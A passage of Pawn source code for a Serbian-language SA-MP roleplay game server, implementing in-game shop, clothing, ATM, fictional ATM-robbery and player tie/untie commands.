			if(UzeoIzMarketa[playerid][4] > 500) UzeoIzMarketa[playerid][4] = 500, SendErrorMessage(playerid, "Ne mozete staviti vise od 500 piva.");
		    return 1;
		}
		else if( strcmp( item, "hamburger", true) == 0 )
		{
		    if( sscanf( params, "{s[32]}d", kolicina ) ) return SendUsageMessage( playerid, "/ubaci hamburger [kolicina]");
		    if( !IsPlayerInRangeOfPoint( playerid, 3.0, -31.8768,-77.5130,1003.5469 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti do standa sa hamburgerima." );
            if( kolicina < 1 || kolicina > 500 ) return SendErrorMessage( playerid, "Mozete staviti najvise 500 ovih stavki u korpu.");
			if(UzeoIzMarketa[playerid][5] >= 500) return SendErrorMessage( playerid, "Vec imate 500 hamburgera u korpi.");

			UkupnaCena[ playerid ] += kolicina*65;
			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom ubacuje %d hamburgera u korpu za kupovinu.", ImeIgraca( playerid ), kolicina ); 
			UzeoIzMarketa[ playerid ][ 5 ] += kolicina;

			if(UzeoIzMarketa[playerid][5] > 500) UzeoIzMarketa[playerid][5] = 500, SendErrorMessage(playerid, "Ne mozete staviti vise od 500 hamburgera.");
		    return 1;
		}
		else if( strcmp( item, "riba", true) == 0 )
		{
		    if( sscanf( params, "{s[32]}d", kolicina ) ) return SendUsageMessage( playerid, "/ubaci riba [kolicina]");
		    if( !IsPlayerInRangeOfPoint( playerid, 3.0, -17.2291,-81.3823,1003.5469 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti do standa sa kokoskama." );
            if( kolicina < 1 || kolicina > 500 ) return SendErrorMessage( playerid, "Mozete staviti najvise 500 ovih stavki u korpu.");
			if(UzeoIzMarketa[playerid][6] >= 500) return SendErrorMessage( playerid, "Vec imate 500 ribe u korpi.");

			UkupnaCena[ playerid ] += kolicina*250;
			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom ubacuje %d riba u korpu za kupovinu.", ImeIgraca( playerid ), kolicina ); 
			UzeoIzMarketa[ playerid ][ 6 ] += kolicina;

			if(UzeoIzMarketa[playerid][6] > 500) UzeoIzMarketa[playerid][6] = 500, SendErrorMessage(playerid, "Ne mozete staviti vise od 500 ribe.");
		    return 1;
		}
		else if( strcmp( item, "cigare", true) == 0 )
		{
		    if( UzeoIzMarketa[ playerid ][ 7 ] == 1 ) return SendErrorMessage( playerid, "Vec si ubacio cigare." );
		    if( !IsPlayerInRangeOfPoint( playerid, 3.0, -37.3030,-76.5274,1003.5469 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti do standa sa cigaretama." );

			UkupnaCena[ playerid ] += 35;
			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "%s levom rukom ubacuje cigare u korpu za kupovinu.", ImeIgraca( playerid ) ); 
			UzeoIzMarketa[ playerid ][ 7 ] = 1;
		    return 1;
		}
		else if( strcmp( item, "upaljac", true) == 0 )
		{
		    if( UzeoIzMarketa[ playerid ][ 8 ] == 1 ) return SendErrorMessage( playerid, "Vec si ubacio upaljac." );
		    if( !IsPlayerInRangeOfPoint( playerid, 3.0, -34.9580,-74.3164,1003.5469 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti do standa sa upaljacima." );

			UkupnaCena[ playerid ] += 25;
			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom ubacuje upaljac u korpu za kupovinu.", ImeIgraca( playerid ) ); 
			UzeoIzMarketa[ playerid ][ 8 ] = 1;
		    return 1;
		}
		else if( strcmp( item, "vatromet", true) == 0 )
		{
		    if( sscanf( params, "{s[32]}d", kolicina ) ) return SendUsageMessage( playerid, "/ubaci vatromet [kolicina]");
		    if( !IsPlayerInRangeOfPoint( playerid, 3.0, -37.3904,-85.7628,1003.5469 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti do standa sa vatrometom." );
            if( kolicina < 1 || kolicina > 10 ) return SendErrorMessage( playerid, "Mozete staviti najvise 10 ovih stavki u korpu.");
			if(UzeoIzMarketa[playerid][9] >= 10) return SendErrorMessage( playerid, "Vec imate 10 vatrometa u korpi.");

			UkupnaCena[ playerid ] += kolicina*3500;
			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom ubacuje %d vatromet/a u korpu za kupovinu.", ImeIgraca( playerid ), kolicina ); 
			UzeoIzMarketa[ playerid ][ 9 ] += kolicina;

			if(UzeoIzMarketa[playerid][9] > 10) UzeoIzMarketa[playerid][9] = 10, SendErrorMessage(playerid, "Ne mozete staviti vise od 10 vatrometa.");
		    return 1;
		}
		else
		{
			SendUsageMessage( playerid, "/ubaci [opcija]");
	     	SendClientMessage( playerid, -1, "OPCIJE: | pizza, uze, maska, sok, pivo, hamburger");
	     	SendClientMessage( playerid, -1, "OPCIJE: | riba, cigare, upaljac, sat, vatromet");
	   	}
	}
	return 1;
}

CMD:buy( playerid, const params[] )
{
    new businessId = GetPlayerBusinessId( playerid, VRSTA_MARKET );

	if( businessId == -1 ) SendErrorMessage( playerid, "Morate biti kod kase u marketu da bi koristili ovu komandu." );
	else if( businessId == -2 ) SendErrorMessage( playerid, "Nemamo vise proizvoda!" );
	else
	{
	    if( !IsPlayerInRangeOfPoint( playerid, 3.0, -28.0849,-89.9528,1003.5469 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti do kase za naplacivanje." );
		if( UkupnaCena[ playerid ] == 0 ) return SendErrorMessage( playerid, "Nemas stvari u korpi koje bi kupio." );

        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
        strcat( DialogStrgEx, "Proizvod\tKolicina\tCena\n" );
		if( UzeoIzMarketa[ playerid ][ 0 ] >= 1 )
		{
			format( globalstring, sizeof( globalstring ), "Pizza\t%d\t$%d\n", UzeoIzMarketa[ playerid ][ 0 ], (UzeoIzMarketa[ playerid ][ 0 ]*100) );
            strcat( DialogStrgEx, globalstring );
		}
	    if( UzeoIzMarketa[ playerid ][ 1 ] == 1 )
		{
	        strcat( DialogStrgEx, "Uze\t1\t200$\n" );
		}
		if( UzeoIzMarketa[ playerid ][ 2 ] == 1 )
		{
		    strcat( DialogStrgEx, "Maska\t1\t800$\n" );
		}
		if( UzeoIzMarketa[ playerid ][ 3 ] >= 1 )
		{
            format( globalstring, sizeof( globalstring ), "Sok\t%d\t$%d\n", UzeoIzMarketa[ playerid ][ 3 ], (UzeoIzMarketa[ playerid ][ 3 ]*40) );
            strcat( DialogStrgEx, globalstring );
		}
		if( UzeoIzMarketa[ playerid ][ 4 ] >= 1 )
		{
            format( globalstring, sizeof( globalstring ), "Pivo\t%d\t$%d\n", UzeoIzMarketa[ playerid ][ 4 ], (UzeoIzMarketa[ playerid ][ 4 ]*55) );
            strcat( DialogStrgEx, globalstring );
		}
	 	if( UzeoIzMarketa[ playerid ][ 5 ] >= 1 )
	 	{
            format( globalstring, sizeof( globalstring ), "Hamburger\t%d\t$%d\n", UzeoIzMarketa[ playerid ][ 5 ], (UzeoIzMarketa[ playerid ][ 5 ]*65) );
            strcat( DialogStrgEx, globalstring );
		}
		if( UzeoIzMarketa[ playerid ][ 6 ] >= 1 )
		{
            format( globalstring, sizeof( globalstring ), "Riba\t%d\t$%d\n", UzeoIzMarketa[ playerid ][ 6 ], (UzeoIzMarketa[ playerid ][ 6 ]*250) );
            strcat( DialogStrgEx, globalstring );
		}
		if( UzeoIzMarketa[ playerid ][ 7 ] == 1 )
		{
		    strcat( DialogStrgEx, "Cigare\t1\t35$\n" );
		}
		if( UzeoIzMarketa[ playerid ][ 8 ] == 1 )
		{
		    strcat( DialogStrgEx, "Upaljac\t1\t25$\n" );
		}
		if( UzeoIzMarketa[ playerid ][ 9 ] >= 1 )
		{
            format( globalstring, sizeof( globalstring ), "Vatromet\t%d\t$%d\n", UzeoIzMarketa[ playerid ][ 9 ], (UzeoIzMarketa[ playerid ][ 9 ]*3500) );
            strcat( DialogStrgEx, globalstring );
		}

		ShowPlayerDialog( playerid, dialog_MARKETBUY, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV, DialogStrgEx, "Kupi sve", "Odustani" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	}
	return 1;
}

CMD:buyt( playerid )
{
	if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Moras biti van vozila." );

	if( PoredTrafike( playerid ) )
	{
		ShowPlayerDialog( playerid, dialog_KIOSK, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																				"#\tItem\tCijena\n\
																				{4282C0}(1).\t{FFFFFF}Dopuna\t20$\n\
																				{4282C0}(2).\t{FFFFFF}Dopuna\t50$\n\
																				{4282C0}(3).\t{FFFFFF}Dopuna\t100$\n\
																				{4282C0}(4).\t{FFFFFF}Dopuna\t500$\n\
																				{4282C0}(5).\t{FFFFFF}Sprite\t15$\n\
																				{4282C0}(6).\t{FFFFFF}Cokoladica\t35$\n\
																				{4282C0}(7).\t{FFFFFF}Pivo\t85$\n\
																				{4282C0}(8).\t{FFFFFF}Coca Cola\t52$\n\
																				{4282C0}(9).\t{FFFFFF}Cigare\t35$\n\
																				{4282C0}(10).\t{FFFFFF}Upaljac\t15$", "Kupi", "Odustani" );
	}
	else return SendErrorMessage( playerid, "Morate biti kod trafike.");
    return 1;
}

CMD:buymobile( playerid )
{
	foreach(new i : iter_Bizz)
	{
        if( IsPlayerInRangeOfPoint( playerid, 35.0, BusinessInfo[ i ][ bExitX ], BusinessInfo[ i ][ bExitY ], BusinessInfo[ i ][ bExitZ ] ) && GetPlayerVirtualWorld( playerid ) == BusinessInfo[ i ][ bInVW ] )
		{
            if( BusinessInfo[ i ][ bType ] == VRSTA_ELEKTRONIK )
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 10000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
				if( PlayerInfo[ playerid ][ xTelefon ] ) return SendErrorMessage(playerid, "Vec imate mobitel.");

               	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
				DajIgracuNovac( playerid, -10000 );
				BussinesMoney( uFirmi[ playerid ], 10000, true );

				PlayerInfo[ playerid ][ xTelefon ] = true;
               	sql_user_update_integer( playerid, "xTelefon", PlayerInfo[ playerid ][ xTelefon ] );

               	new randphone = 100000 + random(899999);
				PlayerInfo[ playerid ][ xBrojTelefona ] = randphone;

				sql_user_update_integer( playerid, "phone_number", PlayerInfo[ playerid ][ xBrojTelefona ]);

               	SendClientMessage( playerid, ZUTA, "(MOBITEL): Uspesno ste kupili mobitel.");
				SCMF( playerid, ZUTA, "(MOBITEL): Vas novi broj mobilnog telefona je {FFFFFF}(%d).", randphone);
			}
			else return SendErrorMessage( playerid, "Morate biti u electronic shopu da bi koristili ovu komandu.");
		}
	}
	return 1;
}

CMD:gps( playerid )
{
	if( PlayerInfo[ playerid ][ xGpsLevel ] == 0 ) return SendErrorMessage( playerid, "Ne posedujete rucni GPS." );

	ShowPlayerDialog( playerid, dialog_GPS_FIND, DIALOG_STYLE_LIST, "{FFFFFF}Izaberi tip:",
																							"{4282C0}(1). {FFFFFF}Vazne lokacije\n\
																							{4282C0}(2). {FFFFFF}Imovina\n\
																							{4282C0}(3). {FFFFFF}Biznisi\n\
																							{4282C0}(4). {FFFFFF}Poslovi\n\
																							{4282C0}(5). {FFFFFF}Misije", "Potvrdi", "Odustani" );
	return 1;
}

CMD:gpsoff( playerid )
{
	SendClientMessage( playerid, ZUTA, "(GPS): {FFFFFF}Ugasili ste checkpoint.");

	SMG_DisablePlayerCheckpoint( playerid );
	CheckpointStatus[ playerid ] = 0;

	if( IsValidDynamicMapIcon( PlayerGpsRadar[ playerid ][_pgrIconId ] ) ) DestroyDynamicMapIcon( PlayerGpsRadar[ playerid ][_pgrIconId] ), PlayerGpsRadar[ playerid ][_pgrIconId] = -1;
    if( IsValidDynamicObject( PlayerGpsRadar[ playerid ][_pgrObject ] ) ) DestroyDynamicObject( PlayerGpsRadar[ playerid ][_pgrObject] ), PlayerGpsRadar[ playerid ][_pgrObject] = -1;
	return 1;
}

CMD:buyelectric( playerid, const params[] )
{
	new businessId = GetPlayerBusinessId( playerid, VRSTA_ELEKTRONIK ), broj;
	if( businessId == -1 ) SendErrorMessage( playerid, "Morate biti u elektronik shopu da bi koristili ovu komandu." );
	else if( businessId == -2 ) SendErrorMessage( playerid, "Nemamo vise proizvoda!" );
 	else
 	{
	    if( sscanf( params, "d", broj ) )
		{
			SendUsageMessage( playerid, "/buyelectric [opcija]");
	     	SendClientMessage( playerid, -1, "Opcije: | 1: GPS za lokacije (2000$/5000$)");
			SendClientMessage( playerid, -1, "Opcije: | 2: Radio (10000$) | 3: Laptop (35000$)" );
			return 1;
		}
		switch(broj)
		{
			case 1:
			{
			    ShowPlayerDialog( playerid, dialog_BUY_GPS, DIALOG_STYLE_LIST, "{FFFFFF}Tip GPS-a?", "{4282C0}(1). {FFFFFF}Osnovni\n{4282C0}(2). {FFFFFF}Napredni", "Potvrdi", "Odustani" );
				return 1;
			}
			case 2:
			{
			    if( PlayerInfo[playerid][xBoombox] ) return SendErrorMessage( playerid, "Vec imate radio." );
			    if( PlayerInfo[ playerid ][ xNovac ] < 10000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(10000$)." );

				DajIgracuNovac( playerid, -10000 );
				BussinesMoney( uFirmi[ playerid ], 10000, true );
				PlayerInfo[playerid][xBoombox] = true;
				sql_user_update_integer(playerid, "xBoombox", PlayerInfo[playerid][xBoombox]);

				SendInfoMessage( playerid, "Kupili ste Boombox(radio), koristite ga putem komande [ /boombox ]." );
				return 1;
			}
			case 3:
			{
			    if( PlayerInfo[ playerid ][ xNovac ] < 35000 ) return SendErrorMessage( playerid, "Nemas dovoljno novca(35000$)." );

			    if( PlayerInfo[playerid][xTorba_Laptop] ) return SendErrorMessage( playerid, "Vec imate laptop." );
				else
				{
					DajIgracuNovac( playerid, -35000 );
					BussinesMoney( uFirmi[ playerid ], 35000, true );
					PlayerInfo[playerid][xTorba_Laptop] = true;
					sql_user_update_integer(playerid, "xTorba_Laptop", PlayerInfo[playerid][xTorba_Laptop]);

					SendInfoMessage( playerid, "Kupio si laptop za {FFFFFF}(35000$)." );
				}
			    return 1;
			}
			default: SendErrorMessage( playerid, "Pogresan broj(opcija).");
		}
	}
	return 1;
}

// CLOTHING SYSTEM
CMD:kupiodecu( playerid )
{
    if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(500$).");
	if( PlayerInfo[ playerid ][ xClan ] != 0 ) return SendErrorMessage( playerid, "Ne mozete kupiti skin jer ste u organizaciji." );
	if( AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes da uzmes skin dok si na duznosti." );

	if( IsPlayerInRangeOfPoint( playerid, 3.0, 1309.6923, -882.9189, 39.5781 ) )
 	{
	    if(PlayerInfo[playerid][xPol] == 1) ShowModelESelectionMenu(playerid, "Select Skin", MENU_SKIN, g_aMaleSkins, sizeof(g_aMaleSkins));
	    else ShowModelESelectionMenu(playerid, "Select Skin", MENU_SKIN, g_aFemaleSkins, sizeof(g_aFemaleSkins));
	}
	else
	{
		foreach(new i : iter_Bizz)
		{
	        if( IsPlayerInRangeOfPoint( playerid, 35.0, BusinessInfo[ i ][ bExitX ], BusinessInfo[ i ][ bExitY ], BusinessInfo[ i ][ bExitZ ] ) && GetPlayerVirtualWorld( playerid ) == BusinessInfo[ i ][ bInVW ] )
			{
	            if( BusinessInfo[ i ][ bType ] == VRSTA_BINCO || BusinessInfo[ i ][ bType ] == VRSTA_SUBURBAN || BusinessInfo[ i ][ bType ] == VRSTA_VICTIM || BusinessInfo[ i ][ bType ] == VRSTA_ZIP )
	            {
					if(PlayerInfo[playerid][xPol] == 1) ShowModelESelectionMenu(playerid, "Select Skin", MENU_SKIN, g_aMaleSkins, sizeof(g_aMaleSkins));
	    			else ShowModelESelectionMenu(playerid, "Select Skin", MENU_SKIN, g_aFemaleSkins, sizeof(g_aFemaleSkins));
				}
				else return SendErrorMessage( playerid, "Morate biti u butiku da bi koristili ovu komandu.");
			}
		}
	}
	return 1;
}

CMD:buyglasses( playerid )
{
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 209.8154, -33.7277, 1001.9297 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti u Suburbanu." );
    if( PlayerInfo[ playerid ][ xNovac ] < 400 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(400$).");

	new objects[30];
	objects[0] = 19006;
	objects[1] = 19007;
	objects[2] = 19008;
	objects[3] = 19009;
	objects[4] = 19010;
	objects[5] = 19011;
	objects[6] = 19012;
	objects[7] = 19013;
	objects[8] = 19014;
	objects[9] = 19015;
	objects[10] = 19016;
	objects[11] = 19017;
	objects[12] = 19018;
	objects[13] = 19019;
	objects[14] = 19020;
	objects[15] = 19021;
	objects[16] = 19022;
	objects[17] = 19023;
	objects[18] = 19024;
	objects[19] = 19025;
	objects[20] = 19026;
	objects[21] = 19027;
	objects[22] = 19028;
	objects[23] = 19029;
	objects[24] = 19030;
	objects[25] = 19031;
	objects[26] = 19032;
	objects[27] = 19033;
	objects[28] = 19034;
	objects[29] = 19035;

	ShowModelESelectionMenu(playerid, "Select Glasses", MENU_GLASSES, objects, sizeof(objects));
	return 1;
}

CMD:buybandanas( playerid )
{
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 151.2055, -92.5647, 1001.8047 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti u Zipu." );
    if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(500$)." );

	new bandanas[9];
	bandanas[0] = 18912;
	bandanas[1] = 18913;
	bandanas[2] = 18914;
	bandanas[3] = 18915;
	bandanas[4] = 18916;
	bandanas[5] = 18917;
	bandanas[6] = 18918;
	bandanas[7] = 18919;
	bandanas[8] = 18920;
	ShowModelESelectionMenu(playerid, "Select Face Bandanas", MENU_FBANDANAS, bandanas, sizeof(bandanas));
	return 1;
}

CMD:buymasks( playerid )
{
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 171.4970, -92.8723, 1001.8047 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti u Zipu." );
    if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(500$)." );

	new bandanas[21];
	bandanas[0] = 18891;
	bandanas[1] = 18892;
	bandanas[2] = 18893;
	bandanas[3] = 18894;
	bandanas[4] = 18895;
	bandanas[5] = 18896;
	bandanas[6] = 18897;
	bandanas[7] = 18898;
	bandanas[8] = 18899;
	bandanas[9] = 18900;
	bandanas[10] = 18901;
	bandanas[11] = 18902;
	bandanas[12] = 18903;
	bandanas[13] = 18904;
	bandanas[14] = 18905;
	bandanas[15] = 18906;
	bandanas[16] = 18907;
	bandanas[17] = 18908;
	bandanas[18] = 18910;
	bandanas[19] = 11704;
	bandanas[20] = 19137;
	ShowModelESelectionMenu(playerid, "Select Masks", MENU_MASKS, bandanas, sizeof(bandanas));
	return 1;
}

CMD:buycaps( playerid, const params[] )
{
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 209.3052,-7.9960,1005.2109 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti u Victimu." );
    if( PlayerInfo[ playerid ][ xNovac ] < 700 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(700$)." );

    #if XMAS_MOD == 0
		new bandanas[9];
	#elseif XMAS_MOD == 1
		new bandanas[10];
	#endif

	bandanas[0] = 18939;
	bandanas[1] = 18940;
	bandanas[2] = 18941;
	bandanas[3] = 18942;
	bandanas[4] = 18943;
	bandanas[5] = 19330;
	bandanas[6] = 19331;
	bandanas[7] = 19554;
	bandanas[8] = 19558;

	#if XMAS_MOD == 1

		bandanas[9] = 19065;

	#endif
	ShowModelESelectionMenu(playerid, "Select Caps", MENU_CAPS, bandanas, sizeof(bandanas), 0.0, -90.0, 0.0);
	return 1;
}

CMD:buyhats( playerid, const params[] )
{
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 205.0401,-100.3267,1005.2578 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti u Bincu." );
    if( PlayerInfo[ playerid ][ xNovac ] < 600 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(600$)." );

	new bandanas[28];
	bandanas[0] = 19067;
	bandanas[1] = 19068;
	bandanas[2] = 19069;
	bandanas[3] = 18926;
	bandanas[4] = 18927;
	bandanas[5] = 18928;
	bandanas[6] = 18929;
	bandanas[7] = 18930;
	bandanas[8] = 18931;
	bandanas[9] = 18932;
	bandanas[10] = 18933;
	bandanas[11] = 18934;
	bandanas[12] = 18935;
	bandanas[13] = 19093;
	bandanas[14] = 19160;
	bandanas[15] = 18944;
	bandanas[16] = 18945;
	bandanas[17] = 18946;
	bandanas[18] = 18947;
	bandanas[19] = 18948;
	bandanas[20] = 18949;
	bandanas[21] = 18950;
	bandanas[21] = 18951;
	bandanas[22] = 19352;
	bandanas[23] = 19487;
	bandanas[24] = 19488;
	bandanas[25] = 19528;
	bandanas[26] = 19553;
	bandanas[27] = 18967;
	ShowModelESelectionMenu(playerid, "Select Hats", MENU_HATS, bandanas, sizeof(bandanas), 0.0, -90.0, 0.0);
	return 1;
}

CMD:trazi( playerid )
{
    if( GetNearestContainer( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu kontejnera." );
    if( TrashSearch[ playerid ] == 1 ) return SendErrorMessage( playerid, "Vec trazite po kontejneru!");
	if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes da trazis dok si u vozilu." );
	if( gettime() < TrashLimit[ playerid ]  ) return SendErrorMessage( playerid, "Morate sacekati %d minuta pre nego sto trazite ponovo!", TrashLimit[playerid] - gettime());

	SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s otvara kontejner, naginje se i pocinje traziti.", ImeIgraca( playerid ) ); 

	SMG_TogglePlayerControllable( playerid, false );
   	Odbrojavanje[ playerid ] = 25;
   	TrashLimit[ playerid ] = gettime()+(30*60);
   	TrashSearch[ playerid ] = 1;

    TrashTimer[ playerid ] = SetPlayerTimerEx(playerid, "TrashLimitOff", 25000, false, "i", playerid);
    ApplyAnimation(playerid,"PED","IDLE_tired",3.0,1,0,0,0,0);
	return 1;
}

CMD:robatm( playerid )
{
	if( GetFactionType( playerid ) == ORG_TIP_VLADINA )
	{
		SendErrorMessage( playerid, "Vrsta vase orge nema razloga koristiti ovo.");
		return 1;
	}

	if( !ShowedATMTD[ playerid ] )
	{
	    if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Tek sa levelom 3+ mozes da opljackas bankomat." );
	    if( GetNearestAtm( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu bankomata." );
    	if( PlayerInfo[ playerid ][ xPljackaVreme ] != 0 ) return SendErrorMessage( playerid, "Vec si pljackao, do sledece pljacke sacekaj %d minuta.", PlayerInfo[ playerid ][ xPljackaVreme ] );
    	new atmid = GetNearestAtm( playerid );
	    if( atmInfo[ atmid ][ atmVremeDoRoba ] != 0 ) return SendErrorMessage( playerid, "Ovaj bankomat je vec opljackan." );

		ATMTDControl( playerid, true );
		SelectTextDraw( playerid, 0x4282C0FF );
		SendInfoMessage( playerid, "Da ugasis menu za pljackanje bankomata ukucaj ponovo '/robatm'." );
	}
	else
	{
	    ATMTDControl( playerid, false );
	    SendInfoMessage( playerid, "Ugasili ste meni za pljackanje bankomata." );
	}
	return 1;
}

CMD:atm( playerid, const params[] )
{
    if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si u vozilu." );
	if( GetNearestAtm( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu bankomata." );

	new item[10];
	if( sscanf( params, "s[10] ", item))
	{
		SendUsageMessage( playerid, "/atm [opcija]");
     	SendClientMessage( playerid, -1, "OPCIJE: status | withdraw");
		return 1;
	}

	if( strcmp( item, "status",true) == 0)
	{
		SCMF( playerid, ZUTA, "(ATM): Imate {FFFFFF}($%d) {FFFF00}na vasem bankovnom racunu.", PlayerInfo[ playerid ][ xBRacun ] );
		return 1;
	}
	else if( strcmp( item, "withdraw",true) == 0)
	{
	    new cashdeposit;
		if( sscanf( params, "s[10]i", item, cashdeposit ) )
		{
			SendUsageMessage( playerid, "/atm withdraw [iznos]");
			return 1;
		}
		if( cashdeposit > PlayerInfo[ playerid ][ xBRacun ] || cashdeposit < 1 ) return SendErrorMessage( playerid, "Nemate toliko novca.");

		DajIgracuNovac( playerid, cashdeposit );
		PlayerInfo[ playerid ][ xBRacun ] -= cashdeposit;
		UpdateBankTD( playerid );
		sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );

		SCMF( playerid, ZUTA, "(ATM): Podigli ste {FFFFFF}($%d) {FFFF00}s vaseg racuna. Na racunu ima: {FFFFFF}($%d)", cashdeposit, PlayerInfo[ playerid ][ xBRacun ] );
		return 1;
	}
	else
	{
		SendUsageMessage( playerid, "/atm [opcija]");
     	SendClientMessage( playerid, -1, "OPCIJE: status | withdraw");
	}
	return 1;
}

CMD:bacisat( playerid )
{
    if( GetNearestContainer( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu kontejnera." );
    if( PlayerInfo[ playerid ][ xSat ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes sat." );
    PlayerInfo[ playerid ][ xSat ] = 0;
	sql_user_update_integer( playerid, "watch", PlayerInfo[ playerid ][ xSat ] );

	SendClientMessage( playerid, 0x4282C0FF, "(DROP): Bacio si sat u kontejner, nemas ga vise u statsima." );
	return 1;
}

CMD:tie( playerid, const params[] )
{
	if( Uze[ playerid ] != true ) return SendErrorMessage( playerid, "Nemas uze." ); 
	if( GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 438 || GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 420 || GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 431 
		|| GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 437 || GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 416 )
	{
		SendErrorMessage( playerid, "Ne mozete svezati nekoga dok ste u uberu / autobusu / kolima hitne pomoci.");
		return 1;
	}

	new giveplayerid;
	if( sscanf( params, "r", giveplayerid ) )
	{
		SendUsageMessage( playerid, "/tie [id]");
	    return 1;
	}
    if( IsPlayerConnected( giveplayerid ) )
	{
	    if( giveplayerid != IPI )
		{
		    if( IgracZavezan[ giveplayerid ] == true ) return SendErrorMessage( playerid, "Igrac je vec zavezan."); 
		    if( KnockedDown[ giveplayerid ] != true ) return SendErrorMessage( playerid, "Moras prvo da oboris igraca. [ /knockout ]." );
			if( IsPlayerNearPlayer( 8.0, playerid, giveplayerid ) )
			{	
			    if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozes zavezati sam sebe!");

				GameTextForPlayer( giveplayerid, "~r~Zavezan", 2500, 3 );
				SCMF( giveplayerid, 0x33CCFFFF, "(TIE): Zavezani ste od strane {FFFFFF}%s.", ImeIgraca( playerid ) );
				SCMF( playerid, 0x33CCFFFF, "(TIE): Zavezali ste {FFFFFF}%s.", ImeIgraca( giveplayerid ) );

                SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s je svezao %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );

				Uze[ playerid ] = false;
				SMG_TogglePlayerControllable( giveplayerid, false );
				IgracZavezan[ giveplayerid ] = true;
			}
			else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
		}
	}
	else SendErrorMessage( playerid, "Taj igrac nije online.");
	return 1;
}

CMD:untie( playerid, const params[] )
{
	new giveplayerid;
	if( sscanf( params, "r", giveplayerid ) ) return SendUsageMessage( playerid, "/untie [id]"); 
	if( IsPlayerConnected( giveplayerid ) )
	{
		if( giveplayerid != IPI )
		{
		    if( IsPlayerNearPlayer(5.0, playerid, giveplayerid ) )
		    {
			    if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozes odvezati samog sebe.");

				if( IgracZavezan[ giveplayerid ] == true )
				{
					GameTextForPlayer( giveplayerid, "~g~Odvezan", 2500, 3 );
					SCMF(giveplayerid, 0x33CCFFFF, "(UNTIE): Odvezani ste od strane {FFFFFF}%s.", ImeIgraca( playerid ));
					SCMF( playerid, 0x33CCFFFF, "(UNTIE): Odvezali ste {FFFFFF}%s.", ImeIgraca( giveplayerid ) );

					SMG_TogglePlayerControllable( giveplayerid, true );
					IgracZavezan[ giveplayerid ] = false;
				}
				else SendErrorMessage( playerid, "Taj igrac nije vezan.");
			}
			else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
		}
	}
	else SendErrorMessage( playerid, "Taj igrac nije online.");
	return 1;
}

CMD:eject( playerid, const params[] )
{
    if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu da bi ste koristili ovu komandu.");
    if( GetPlayerState( playerid )!= PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Niste vozac.");

	new ID;
	if( sscanf( params, "u", ID ) )
	{
		SendUsageMessage( playerid, "/eject [id]");
	    return 1;
	}
	if( IsPlayerConnected( ID ) )
	{
	    if( ID != IPI )
	    {
			if( ID == playerid ) return SendErrorMessage( playerid, "Ne mozete izbaciti sami sebe.");
		    if( IsPlayerInVehicle( ID, GetPlayerVehicleID( playerid ) ) )
		    {
